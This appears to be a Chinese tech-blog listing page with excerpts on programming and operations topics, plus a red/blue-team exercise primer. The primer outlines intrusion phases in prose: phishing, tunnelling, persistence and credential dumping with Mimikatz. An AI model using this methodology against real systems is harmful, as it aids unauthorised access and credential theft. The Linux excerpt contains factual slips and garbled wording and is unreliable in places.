看，做得很贴心，直接给出了vs的版本下载地址，并提示解压路径，至于为什么是这个路径，一会再说
我们按步骤来，下载talib, 解压到c:\ta-lib
下载完是这样的，我们先直接解压在当前目录
好，如上图，解压完成，我们点击进去看看
看到里面刚好用一个ta-lib目录，不错，就是这个玩意，我们把它放到c盘下面去
ok, 这样就完成了，然后我们接着看说明
这里提到是这个包只提供了32位的版本，但我们目前用的都是64位的python,这就需要我们自己重新编译一下，或者去底下这个网址下载对应版去安装了，显然不是我们的目地，我选择自己动手
按上面的步骤，开始编译库
我系统是win10
在开始菜单里找到 x64 Native Tools
然后去到 C:\ta-lib\c\make\cdr\win32\msvc
我们输入 cd /d C:\ta-lib\c\make\cdr\win32\msvc
这样就算成功到达这个目录了
然后我们输入nmake 进行编译即可，如果一切顺利的话，应该会出现如下画面
我们等待它编译完成，我给出最后编译成功的界面
ok,不要报任何错误
好，接下来我们开始安装 python 的 talib库，我们全新安装python 3.11.1 来测试
安装完成，接下来，我们试安装下talib 库
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/40d17e3946001db6289f4815addd3aa5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2ba9472d2f405f4926185a7f3450260/" rel="bookmark">
			图解Redis数据同步（全量 &#43; 增量）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		全量同步和增量同步概述： 全量同步：master将完整内存数据生成RDB，发送RDB到slave。后续命令则记录在repl_baklog，逐个发送给slave。
增量同步：slave提交自己的offset到master，master获取repl_baklog中从offset之后的命令给slave
什么时候执行全量同步？ slave节点第一次连接master节点时
slave节点断开时间太久，repl_baklog中的offset已经被覆盖时
什么时候执行增量同步？ slave节点断开又恢复，并且在repl_baklog中能找到offset时
增量同步 rel_baklog：可以理解为是一个数据存储的集合
offset：偏移量，随着记录在repl_baklog中的数据增多而逐渐增大。slave完成同步时也会记录当前同步的offset。 如果slave的offset小于master的offset，说明slave数据落后于master，需要更新
replid：当前master节点的唯一标识，在同步前确保该slave节点对应的master节点的同一个
rel_baklog底层是一个数组，他有一个特点是超出下标范围就会从0下标开始覆写，如果slave对于覆写部分已经进行了读取那还好，如果没有进行读取，那么就不能再在repl_baklog中通过offset来读取新数据，而是将原数据全部删除，再对主节点进行全量同步操作才行 slave做数据同步，必须向master声明自己的replication id 和offset，master才可以判断到底需要同步哪些数据
全量同步 基本流程： 1.从节点向主节点发送 SYNC 命令请求进行同步。
该命令请求包含了一个参数，表示从节点的复制偏移量repl_offset以及目标master节点的idreplid。该偏移量指定了从节点需要获取的数据起始点，master节点的id指定了具体同步的master节点
2.主节点收到 SYNC 请求后，开始执行 BGSAVE 命令生成 RDB 文件，并使用缓冲区记录所有接收到的写命令操作。
主节点接收到 SYNC 命令请求后，会执行 BGSAVE 命令生成 RDB 文件，并将所有接收到的写命令操作记录在主节点的 Replication Buffer 中。
Replication Buffer 是 Redis 主节点用来缓存新的写操作的内存区域，它位于主节点的服务器状态结构体 server 中。通常情况下，主节点会将所有的写操作持久化保存在 AOF 日志文件中，但是在进行全量同步时，为了减少网络传输的压力，主节点将新的写操作暂时保存在 Replication Buffer 中。
3.当 BGSAVE 命令执行完毕并成功生成 RDB 文件后，主节点通过网络将这个 RDB 文件发送给从节点，并将缓冲区中记录的所有写命令也一起发送给从节点。
当 BGSAVE 命令执行完毕并成功生成 RDB 文件后，主节点将该RDB文件发送给从节点，并将缓冲区中记录的所有写命令也一起发送给从节点。
在全量同步时，主节点不仅需要将自己保存的数据发送给从节点，还需要记录接下来的写操作。因此，主节点通过网络将 RDB 文件和缓冲区中的所有写命令发送给从节点，以确保从节点可以获取到最新的数据状态。
4.从节点接收到主节点发送的 RDB 文件和写命令缓冲区后，先加载 RDB 文件，然后再执行缓冲区中的写命令，以达到与主节点相同的数据状态。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e2ba9472d2f405f4926185a7f3450260/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/efbd852f2e0f13bc3cc42462a906d348/" rel="bookmark">
			QT 中使用QFile如何识别txt文件的编码格式：utf-8 ANSI
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列文章目录 文章目录 系列文章目录前言一、判断txt文件编码格式二、解决方法具体使用 三、参考 前言 小弟我在在上一篇Qt中QFile类读取ansi编码格式txt文件，在QTextEdit控件中显示乱码
文章中聊到如何读取ANSI和UFT-8文件，但有个前提是首先知道txt文件的编码格式，如何程序中我们事先不知道txt文件的编码格式那我们怎么做呢？下面我和大家就来聊聊如何判断文件的编码格式
一、判断txt文件编码格式 Qt提供了一个类QTextCodec类，专门用来对字符串进行不同编码方式的转换。
其中重要的两个静态方法是:fromUnicode和toUnicode。
通过这两个静态方法可以将其他类型（如gbk）的字符串转换为utf-8字符串（采用toUnicode），或者将utf-8的字符串转换为其他类型（如gbk）的字符串（采用fromUnicode）。
基本原理是：拿到一定长度的 字节流 然后判断含有哪些 byte 就知道是什么东西了，如果是文本文件，先尝试读前两个字节，看是否是BOM，windows，Qt对字符串默认是采用utf-8编码的，如果要打开gbk的文件，依然采用utf-8编码的话，当然就不识别了，显示就是乱码。
读取txt文件时,很多时候无法获取文件的编码格式.如果直接进行使用,则有可能出现乱码.需要在使用前将其转为Unicode(Qt的默认编码格式). 虽然实际的编码格式种类非常多,但平常主要使用的有GBK与UTF-8两种.可以依次尝试转换,如果转换出现无效字符则认为不是该种编码格式. QString GetCorrectUnicode(const QByteArray &amp;ba) { QTextCodec::ConverterState state; QTextCodec *codec = QText
二、解决方法 enum class EncodingFormat : int { ANSI = 0,//GBK UTF16LE, UTF16BE, UTF8, UTF8BOM, }; EncodingFormat ProjectWin::FileCharacterEncoding(const QString &amp;fileName) { //假定默认编码utf8 EncodingFormat code = EncodingFormat::UTF8; QFile file(fileName); if (file.open(QIODevice::ReadOnly)) { //读取3字节用于判断 QByteArray buffer = file.read(3); quint8 sz1st = buffer.at(0); quint8 sz2nd = buffer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/efbd852f2e0f13bc3cc42462a906d348/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b87a48c9202716c9bcfd424da420308/" rel="bookmark">
			使用wireshark抓取https明文包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		## 设置wireshark抓取本地https包
### 原理
1. 几乎所有的浏览器以及curl默认支持一个环境变量，当存在该环境变量时。浏览器会自动将https协商用的对称密钥写入该环境变量指向的文件(按照一定的格式)
2. wireshark可以从指定文件中读取密钥，从而使用该密钥对https报文进行解密
3. 该方式不区分平台
### 方法
1. 新建环境变量，name为`SSLKEYLOGFILE`,value为指定的某一调试文件路径，如`D:\sslkey.log`
该文件存储ssl握手时的pre-master信息
2. 重新打开chrome浏览器,发现指定路径下，chrome已经自行创建`sslkey.log`。如果没有的话需要重启PC后再打开浏览器，检查chrome是否创建了`sslkey.log`
3. 配置wireshark：编辑-&gt;首选项-&gt;protocols-&gt;TLS,设置`pre-master-secret log file name`项为环境变量配置的文件路径
4. 访问一个https服务器，追踪流可以发现https数据包已经是明文
5. 抓取客户端的https包要注意，先启动wireshark，然后重启客户端的所有进程
###补充
1. 关于安全的问题，需要设置环境变量并且重启进程，因此除非攻击者已经攻陷了终端，一般情况下都是有保障的
2. 关于`SSLKEYLOGFILE`环境变量的补充，这是一个通用的环境变量，大多数网络库的实现都使用到了这一环境变量进行ssl调试。比如chorme浏览器，curl网络库等。具体使用根据不同软件而异，一般默认会启用该调试功能(参考curl源码)
3. 因为使用的是环境变量，以上方法跨平台通用(已经测试linux(包括国产的信创系统)/mac/windows)。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fdfc695075908d10b30629783d1dbd10/" rel="bookmark">
			开源 Golang 微服务入门三：ORM 框架 GORM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 前两篇笔记分别介绍了 Golang 微服务 HTTP 框架 Hertz 和 Golang 微服务 RPC 框架 Kitex，本文将要介绍面向ORM(持久层)框架 GORM。
官方文档
GORM 是面向 Golang 语言的一种 ORM(持久层)框架，支持多种数据库的接入，例如 MySQL，PostgreSQL，SQLite，SQL Server，Clickhouse。此框架的特点，弱化了开发者对于 SQL 语言的掌握程度，使用提供的 API 进行底层数据库的访问。
GORM 官方支持的数据库类型有： MySQL, PostgreSQL, SQlite, SQL Server。
作者是中国人，中文文档齐全，对开发者友好，支持主流数据库。
特点：
全功能ORM;关联(包含一个，包含多个，属于，多对多，多种包含);Callbacks(创建/保存/更新/删除/查找之前/之后);预加载;事务复合主键SQL Builder自动迁移日志可扩展，编写基于GORM回调的插件每个功能都有测试开发人员友好 快速启动 安装与连接： go get github.com/jinzhu/gorm 连接 MySQL 数据库：
package main import ( "fmt" "gorm.io/driver/mysql" "gorm.io/gorm" "time" ) func main() { // 参考 https://github.com/go-sql-driver/mysql#dsn-data-source-name 获取详情 //dsn := "user:pass@tcp(127.0.0.1:3306)/dbname?charset=utf8mb4&amp;parseTime=True&amp;loc=Local" //db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config{}) db, err := gorm.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fdfc695075908d10b30629783d1dbd10/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10cc07094e05dcec3e2a1f5fa30c6f2a/" rel="bookmark">
			nginx 查找配置文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于年代久远或者安装方式差异，可能会忘记nginx配置文件路径，要想找到nginx配置文件，首先要找到nginx命令，然后通过nginx命令找到配置文件路径。
找到nginx命令 使用which nginx，来找到nginx命令路径
[root@VM-0-5-centos sbin]# which nginx /usr/sbin/nginx 找到配置文件路径 有两种找到配置文件路径方法，第一种查看nginx配置参数，第二种校验配置文件，输出配置文件路径。
查看配置参数方式 [root@VM-0-5-centos sbin]# /usr/sbin/nginx -V nginx version: nginx/1.16.1 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.1.1c FIPS 28 May 2019 (running with OpenSSL 1.1.1g FIPS 21 Apr 2020) TLS SNI support enabled configure arguments: --prefix=/usr/share/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib64/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log 找到conf-path，
--conf-path=/etc/nginx/nginx.conf 校验配置文件，输出配置文件路径 利用 /usr/sbin/nginx -t 输出配置文件路径
[root@VM-0-5-centos sbin]# /usr/sbin/nginx -t nginx: the configuration file /etc/nginx/nginx.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10cc07094e05dcec3e2a1f5fa30c6f2a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5bcfaca9bce71d1d1681541df16632fd/" rel="bookmark">
			【华为OD机试 2023】最优高铁城市修建方案（C&#43;&#43; Java JavaScript Python）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		华为od机试题库 华为OD机试2022&amp;2023（C++Java JS Py）：https://blog.csdn.net/banxia_frontend/category_12225173.html
华为OD机试2023最新题库 更新中~（C++Java JS Py）：https://blog.csdn.net/banxia_frontend/category_12228764.html
华为OD机试题库 复盘中~（C++Java JS Py）：https://blog.csdn.net/banxia_frontend/category_12257144.html
题目描述
高铁城市圈对人们的出行、经济的拉动效果明显。每年都会规划新的高铁城市圈建设。
在给定：城市数量，可建设高铁的两城市间的修建成本列表、以及结合城市商业价值会固定建设的两城市建高铁。
请你设计算法，达到修建城市高铁的最低成本。
注意，需要满足城市圈内城市间两两互联可达(通过其他城市中转可达也属于满足条件）。
输入描述
第一行，包含此城市圈中城市的数量、可建设高铁的两城市间修建成本列表数量、必建高铁的城市列表。三个数字用空格间隔。 可建设高铁的两城市间的修建成本列表，为多行输入数据，格式为3个数字，用空格分隔，长度不超过1000。 固定要修建的高铁城市列表，是上面参数2的子集，可能为多行，每行输入为2个数字，以空格分隔。 ————————————————
版权声明：本文为CSDN博主「算法大师」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/banxia_frontend/article/details/129459019
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90c74227636f0adc7bf3a4b651fa66fc/" rel="bookmark">
			【 华为OD机试 2023】信号发射和接收（C&#43;&#43; Java JavaScript Python）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		华为od机试题库 华为OD机试2022&amp;2023（C++Java JS Py）：https://blog.csdn.net/banxia_frontend/category_12225173.html
华为OD机试2023最新题库 更新中~（C++Java JS Py）：https://blog.csdn.net/banxia_frontend/category_12228764.html
华为OD机试题库 复盘中~（C++Java JS Py）：https://blog.csdn.net/banxia_frontend/category_12257144.html
有一个二维的天线矩阵，每根天线可以向其他天线发射信号，也能接收其他天线的信号，为了简化起见，我们约定每根天线只能向东和向南发射信号，换言之，每根天线只能接收东向或南向的信号。
每根天线有自己的高度anth，每根天线的高度存储在一个二维数组中，各个天线的位置用[r, c]表示，r代表天线的行位置（从0开始编号），c代表天线的列位置（从0开始编号）。
在某一方向（东向或南向），某根天线可以收到多根其他天线的信号（也可能收不到任何其他天线的信号），对任一天线X和天线Y，天线X能接收到天线Y的条件是：
天线X在天线Y的东边或南边 天线X和天线Y之间的其他天线的高度都低于天线X和天线Y，或天线X和天线Y之间无其他天线，即无遮挡。 ————————————————
版权声明：本文为CSDN博主「算法大师」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/banxia_frontend/article/details/129340758
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a21448a642ec021f508cf954d113767/" rel="bookmark">
			Linux系统简介-虚拟机安装教程(保姆级)-Linux常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux系统简介-虚拟机安装教程-Linux常用命令 1.Linux系统简介1.1Linux系统的历史1.2Linux系统的特点和优势1.3Linux发行版的分类 2.虚拟机的安装教程2.1虚拟机的概念2.2虚拟机的安装步骤2.2.1安装虚拟机软件2.2.2下载Linux镜像文件2.2.3创建虚拟机2.2.4安装Linux操作系统 3.Linux常用命令3.1文件和目录操作3.1.1 目录查看 Is3.1.2 pwd3.1.3 目录切换 cd3.1.4 创建目录mkdir3.1.5 删除目录或文件 rm3.1.6 目录修改 cp 和 mv 3.2文本文件编辑3.2.1 查看内容 cat3.2.2 more与less 查看大内容3.2.4 修改文件 vi/vim 3.3系统管理3.3.1 ps3.3.2 kill 1.Linux系统简介 1.1Linux系统的历史 Linux操作系统的诞生、发展和成长过程始终依赖着五个重要支柱：Unix操作系统、MINIX操作系统、GNU计划、POSIX标准和Internet网络。
20世纪80年代，计算机硬件的性能不断提高，PC的市场不断扩大，当时可供计算机选用的操作系统主要有Unix、DOS和MacOS这几种。Unix价格昂贵，不能运行于PC；DOS显得简陋，且源代码被软件厂商严格保密；
MacOS是一种专门用于苹果计算机的操作系统。此时，计算机科学领域迫切需要一个更加完善、强大、廉价和完全开放的操作系统。由于供教学使用的典型操作系统很少，因此当时在荷兰当教授的美国人AndrewS.Tanenbaum编写了一个操作系统，名为MINIX，为了向学生讲述操作系统内部工作原理。MINIX虽然很好，但只是一个用于教学目的的简单操作系统，而不是一个强有力的实用操作系统，然而最大的好处就是公开源代码。全世界学计算机的学生都通过钻研MINIX源代码来了解电脑里运行的MINIX操作系统，芬兰赫尔辛基大学大学二年级的学生Linus Torvalds就是其中一个，在吸收了MINIX精华的基础上，Linus于1991年写出了属于自己的Linux操作系统，版本为Linux0.01，是Linux时代开始的标志。他利用Unix的核心，去除繁杂的核心程序，改写成适用于一般计算机的x86系统，并放在网络上供大家下载，1994年推出完整的核心Version1.0，至此，Linux逐渐成为功能完善、稳定的操作系统，并被广泛使用。
Linux操作系统的诞生、发展和成长过程始终依赖着五个重要支柱：UNIX 操作系统、MINIX 操作系统、GNU计划、POSIX 标准和Internet 网络。
984年，Andrew S.Tanenbaum开发了用于教学的UNIX系统，命名为Mininx。
1989年，Andrew S.Tanenbaum将Minix系统运行于x86的PC平台。
1990年，芬兰赫尔辛基大学学生Linux Torvalds首次接触Minix系统。
1991年，Linux Torvalds开始在Minix上编写各种驱动程序等操作系统内核组件。
1991年年底，Linux Torvalds公开了Linux内核源码0.02版
1994年，Linux 1.0版本发布
1996年，Linux 2.0版本发布
2011年，Linux3.0版本发布
这里面我们所介绍的发布时间，指的都是内核大版本的发布时间，次要版本号更新时间请参看FAQ
1.2Linux系统的特点和优势 1.开源
Linux的主要优点之一是它是一个开放源代码的操作系统，即，每个人都可以轻松获得其源代码。任何有编码能力的人都可以出于任何目的贡献，修改，增强和分发代码给任何人。
2.安全性
与Windows等其他操作系统相比，Linux更安全。Linux并不完全安全，因为它也存在一些恶意软件，但它不如其他恶意软件脆弱。Linux中的每个程序，无论是应用程序还是病毒，都需要密码形式的管理员授权。除非输入密码，否则不会执行病毒。Linux中不需要任何防病毒程序。
3.复兴旧的计算机系统
Linux帮助您将旧的和过时的计算机系统用作防火墙，路由器，备份服务器或文件服务器等。根据系统功能，可以使用许多发行版。您可以将Puppy Linux用于低端系统。
4.软件更新
在Linux中，您会遇到大量的软件更新。这些软件更新比任何其他操作系统中的更新都快得多。Linux中的更新可以轻松完成，而不会遇到任何重大问题。
5.定制
相对于其他操作系统，一个主要优点是自定义。您可以自定义任何功能，根据需要添加或删除任何功能，因为它是开源操作系统。不仅如此，还可以安装各种墙纸和精美的图标主题，为您的系统带来惊人的外观。
6.各种发行
有许多可用的发行版，也称为Linux发行版。它为用户提供了各种选择或口味。您可以根据需要选择任何一家小酒馆。Linux的一些小酒馆是Fedora，Ubuntu，Arch Linux，Debian，Linux Mint等等。如果您是初学者，则可以使用Ubuntu或Linux Mint。如果您是一名优秀的程序员，则可以使用Debian或Fedora。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5a21448a642ec021f508cf954d113767/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fab09075ede155bc8ab7f9d3fc2fd8fb/" rel="bookmark">
			PowerShell系列（五）：PowerShell通过脚本方式运行笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、四种执行方式介绍
1、当前文件夹运行命令
2、直接指定完整文件路径执行
3、通过cmd命令直接执行
4、通过Windows计划任务执行PowerShell脚本
二、通过脚本方式执行命令的优势
往期回顾 PowerShell系列（一）：PowerShell介绍和cmd命令行的区别
PowerShell系列（二）：PowerShell和Python之间的差异介绍
PowerShell系列（三）：PowerShell发展历程梳理
PowerShell系列（四）：PowerShell进入交互环境的三种方式
PowerShell 是一种用于操作 系统的命令行界面，支持跨平台，它提供了许多功能来自动化和优化各种任务。PowerShell 是由微软官方开发的，并作为 Windows Server 操作系统的一部分提供。 使用 PowerShell，您可以执行许多运维操作，例如创建、编辑、查看和删除文件和文件夹，管理用户和计算机，配置网络设置，运行系统命令，自动化测试和部署等。今天继续给大家分享PowerShell系列教程。
上一篇文章讲解了Powershell通过交互环境运行命令的相关知识，今天给大家介绍实际工作当中使用最频繁的方式——通过脚本运行，简单来说就是和咱们实际编写代码一样，先编写代码，然后通过开发工具执行。同样的为了实现PowerShell脚本的保存、方面在别的服务器迁移，一般都是先编写脚本，然后通过脚本文件执行完成相应的运维任务。
PowerShell通过脚本方式的好处主要有以下几条：
可以将常见的运维操作封装成脚本，方便后续的重复使用和维护。可以使用 PowerShell 的强大功能来自动化和优化服务器的各种任务。可以将 PowerShell 脚本与其他软件和工具集成，从而提高工作效率。可以使用 PowerShell 脚本来执行任何类型的操作，包括系统管理、安全、性能优化和自动化测试等场景。可以通过 PowerShell 脚本来定义和执行自定义命令和操作，以满足特定的需求和环境。 总得来说使用 PowerShell 脚本可以让您更加高效地管理和操作系统，提高工作效率并增强系统的可维护性。下面给大家详细介绍一下。
案例脚本
首先打开 WindowPowerShell ISE 开发环境新建一个test.ps1，脚本内容如下：
$arr1=1..10 #定义一个1~10的数组 $arr1 #打印数组 一、四种执行方式介绍 1、当前文件夹运行命令 进入存放脚本文件的命令，然后执行：
.\psl1脚本文件
我的脚本文件存放在F盘的桌面目录执行命令如下：
F #进入F盘 cd 桌面 #进入桌面文件夹 .\test.ps1 #运行命令 2、直接指定完整文件路径执行 完整psl1脚本文件
F:\桌面\test.ps1 具体如下图 3、通过cmd命令直接执行 需要加关键字PowerShell才可以识别是执行的PowerShell命令。
命令格式：PowerShell ps1脚本文件完整路径
4、通过Windows计划任务执行PowerShell脚本 PowerShell 脚本默认无法执行，需要先修改 PowerShell 执行策略（ExecutionPolicy）命令如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fab09075ede155bc8ab7f9d3fc2fd8fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca7e58c25bfffe7341e07ab8e5960b8d/" rel="bookmark">
			护网HW（红蓝队）小白必知必会
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一章 什么是蓝队 蓝队，一般是指网络实战攻防演习中的攻击一方。
👉网安（黑客红蓝对抗）所有方向的学习路线👈
蓝队一般会采用针对目标单位的从业人员，以及目标系统所在网络内的软件、硬件设备同时执行多角度、全方位、对抗性的混合式模拟攻击手段；通过技术手段实现系统提权、控制业务、获取数据等渗透目标，来发现系统、技术、人员、管理和基础架构等方面存在的网络安全隐患或薄弱环节。
蓝队人员并不是一般意义上的电脑黑客。因为黑客往往以攻破系统，获取利益为目标；而蓝队则是以发现系统薄弱环节，提升系统安全性为目标。此外，对于一般的黑客来说，只要发现某一种攻击方法可以有效地达成目标，通常就没有必要再去尝试其他的攻击方法和途径；但蓝队的目标则是要尽可能地找出系统中存在的所有安全问题，因此往往会穷尽已知的“所有”方法来完成攻击。换句话说，蓝队人员需要的是全面的攻防能力，而不仅仅是一两招很牛的黑客技术。
蓝队的工作也与业界熟知的渗透测试有所区别。渗透测试通常是按照规范技术流程对目标系统进行的安全性测试；而蓝队攻击一般只限定攻击范围和攻击时段，对具体的攻击方法则没有太多限制。渗透测试过程一般只要验证漏洞的存在即可，而蓝队攻击则要求实际获取系统权限或系统数据。此外，渗透测试一般都会明确要求禁止使用社工手段（通过对人的诱导、欺骗等方法完成攻击），而蓝队则可以在一定范围内使用社工手段。
还有一点必须说明:虽然实战攻防演习过程中通常不会严格限定蓝队的攻击手法，但所有技术的使用，目标的达成，也必须严格遵守国家相关的法律和法规。
在演习实践中，蓝队通常会以3人为一个战斗小组，1人为组长。组长通常是蓝队中综合能力最强的人，需要较强的组织意识、应变能力和丰富的实战经验。而2名组员则往往需要各有所长，具备边界突破、横向移动（利用一台受控设备攻击其他相邻设备）、情报收集或武器研制等某一方面或几个方面的专长。
蓝队工作对其成员的能力要求往往是综合性的、全面性的。蓝队成员不仅要会熟练使用各种黑客工具、分析工具，还要熟知目标系统及其安全配置，并具备一定的代码开发能力，以便应对特殊问题。
第二章 蓝队演变趋势 “魔高一尺道高一丈”！防守能力提升的同时，攻击能力也在与时俱进。目前，蓝队的工作已经变得非常体系化、职业化和工具化，主要变现如下。
👉网安（黑客红蓝对抗）所有方向的学习路线👈
1） 体系化
从漏洞准备、工具准备，到情报收集、内网渗透等，每个人都有明确的分工，有组织地形成团队作战能力，已经很少有一个人干全套的情况了。
2） 职业化
蓝队人员都来自各组织专职实战演习团队，有明确分工和职责，具备协同配合的职业操守，平时开展专业化训练。
3） 工具化
工具化程序持续提升，除了使用常用渗透工具，基于开源代码的定制化工具应用增多，自动化攻击被大规模应用，如采用多IP出口的自动化攻击平台进行作业。
从实战对抗的手法来看，现如今的蓝队还呈现出社工化、强对抗和迂回攻击的特点。
1） 社工化
利用“人”的弱点实施社会工程学攻击，是黑产团伙和高级威胁组织的常用手段，如今也被大量引入实战攻防演习当中。
除了钓鱼、水坑等传统社工攻击手段外，如今的蓝队还会经常通过在线客服、私信好友等多种交互平台进行社工攻击，以便更加高效地获取业务信息。社工手段的多变性往往会让防守方防不胜防。
2） 强对抗
利用0Day漏洞、NDay漏洞、免杀技术等方式与防守方进行高强度的技术对抗，也是近1-2年来蓝队在实战攻防演习中表现出的明显特点。特别的，蓝队人员大多出自安全机构，经过专业训练，因此往往会比民间黑客更加了解安全软件的防护机制和安全系统的运行原理，其使用的对抗技术也往往更具针对性。
3） 迂回攻击
对于防护严密，有效监控的目标系统来说，正面攻击往往难以奏效。这就迫使蓝队越来越多的采用“曲线救国”的攻击方式，将战线拉长：从目标系统的同级单位和下级单位入手，从供应链及业务合作方下手，在防护相对薄弱的关联机构中寻找突破点，通过迂回攻击的方式攻破目标系统。
第三章 蓝队四板斧——攻击的四个阶段 蓝队的攻击并非是天马行空的撞大运，而是一个有章可循、科学合理的作战过程。一般来说，蓝队的工作可分为四个阶段：站前准备、情报收集、建立据点和横向移动。我们也常将这个四个阶段称为蓝队工作的“四板斧”。
👉网安（黑客红蓝对抗）所有方向的学习路线👈
一、 第一阶段：准备收集
在一场实战攻防演习作战开始前，蓝队人员主要会从以下几个方面进行准备。
1） 漏洞挖掘
漏洞一直是第一攻击力。前期的漏洞挖掘对于打开突破口显得非常重要，在实战中，漏洞挖掘工作一般会聚焦于互联网边界应用、网络设备、办公应用、运维系统、移动办公、集权管控等方面。此外，只是找到漏洞还不够，好的漏洞利用方式也是十分重要的。想要在不通环境下达到稳定、深度的漏洞利用，这对漏洞挖掘人员来说是一个不小的挑战。
2） 工具储备
工具的目的是为了提升工作效率，好的工具往往能事半功倍，在实战中，蓝队通常需要准备信息收集、钓鱼、远控、WebShell管理、隧道、扫描器、漏洞利用等多种工具。
3） 战法策略
团队作战考虑的是配合，因此，攻击队成员的分工角色就显得尤为重要，小的战役靠个人，大的战役一定是靠机制、流程以及团队合作。好的战法策略，对于一场大的战役来讲至关重要。
4） 以赛代练
日常的任务中，需要挑选出一些具有代表性的任务来对蓝队进行有针对性的训练，有利于蓝队队员提高自身的技能。参加各类安全大赛将非常有助于蓝队队员的技术能力提升。
二、 第二阶段：情报收集
当蓝队专家接到目标任务后，并不会像渗透测试那样在简单收集数据后直接去尝试各种常见漏洞，而是先去做情报侦察和信息收集工作。收集的内容包括目标系统的组织架构、IT资产、敏感信息泄露、供应商信息等各个方面。
组织架构包括单位部门划分、人员信息、工作职能、下属单位等；IT资产包括域名、IP地址、C段、开放端口、运行服务、Web中间件、Web应用、移动应用、网络架构等；敏感信息泄露包括代码泄露、文档信息泄露、邮箱信息泄露、历史漏洞泄露信息等方面；供应商信息包括相关合同、系统、软件、硬件、代码、服务、人员等相关信息。
掌握了目标企业相关人员信息和组织架构，可以快速定位关键人物以便实施鱼叉攻击，或确定内网横纵向渗透路径；而收集了IT资产信息，可以为漏洞发现和利用提供数据支撑；掌握企业与供应商合作相关信息，可为有针对性开展供应链攻击提供素材。而究竟是要社工钓鱼，还是直接利用漏洞攻击，抑或是从供应链下手，一般取决于安全防护的薄弱环节究竟在哪里，以及蓝队对攻击路径的选择。
第三阶段：建立据点
在找到薄弱环节后，蓝队专家会尝试利用漏洞或社工等方法去获取外网系统控制权限，一般称之为“打点”或撕口子。在这个过程中，蓝队专家会尝试绕过WAF、IPS、杀毒软件等防护设备或软件，用最少的流量、最小的动作去实现漏洞利用。
通过撕开的口子，寻找和内网联通的通道，再进一步进行深入渗透，这个由外到内的过程一般称之为纵向渗透。如果没有找到内外联通的DMZ区（Demilitarized Zone，隔离区），蓝队专家会继续撕口子，直到找到接入内网的点为止。
当蓝队专家找到合适的口子后，便可以把这个点作为从外网进入内网的根据地。通过frp、ewsocks、reGeorg等工具在这个点上建立隧道，形成从外网到内网的跳板，将它作为实施内网渗透的坚实据点。
若权限不足以建立跳板，蓝队专家通常会利用系统、程序或服务漏洞进行提权操作，以获得更高权限；若据点是非稳定的PC机，则会进行持久化操作，保证PC机重启后，据点依然可以在线。
第四阶段：横向移动
进入内网后，蓝队专家一般会在本机以及内部网络开展进一步信息收集和情报刺探工作。包括收集当前计算机的网络连接、进程列表、命令执行历史记录、数据库信息、当前用户信息、管理员登录信息、总结密码规律、补丁更新频率等信息；同时对内网的其他计算机或服务器的IP、主机名、开放端口、开放服务、开放应用等情况进行情报刺探。再利用内网计算机、服务器不及时修复漏洞、不做安全防护、同口令等弱点来进行横向渗透扩大战果。
对于含有域的内网，蓝队专家会在扩大战果的同时去寻找域管理员登录的蛛丝马迹。一旦发现某台服务器有域管理员登录，就可以利用Mimikatz等工具去尝试获得登录账号密码明文，或者用Hashdump工具去导出NTLM哈希，继而实现对域控服务器的渗透控制。
在内网漫游过程中，蓝队专家会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。
